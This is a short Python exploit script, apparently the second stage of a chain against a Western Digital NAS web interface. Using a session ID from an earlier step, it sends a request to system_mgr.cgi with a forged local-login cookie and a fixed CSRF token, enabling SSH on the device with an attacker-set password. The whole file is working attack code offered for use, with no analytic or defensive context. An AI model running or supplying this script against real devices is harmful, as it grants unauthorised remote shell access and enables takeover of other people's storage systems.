import requests
import sys

if len ( sys.argv ) > 2:
	pass
if len (sys.argv) < 2:
	print "+usage: pwn2.py ip session"
	print "run step 1 to get the session"
	sys.exit()

  
pwn0_url = "http://%s/cgi-bin/system_mgr.cgi" % (sys.argv[1])
pwn0_cookies = {"local_login": "1", "fw_version": "2.40.155", "PHPSESSID": "", "WD-CSRF-TOKEN": "fixed"}
pwn0_cookies['PHPSESSID'] = (sys.argv[2])
pwn0_headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-CSRF-Token": "fixed", "X-Requested-With": "XMLHttpRequest", "Origin": "http://", "Connection": "close", "Referer": "http:///"}
pwn0_headers['Referer'] = "http://%s/" % (sys.argv[1])
pwn0_headers['Origin'] = "http://%s" % (sys.argv[1])
pwn0_data = {"cmd": "cgi_ssh", "ssh": "1", "pw": "cHduMm93bjIwMjA="}
requests.post(pwn0_url, headers=pwn0_headers, cookies=pwn0_cookies, data=pwn0_data)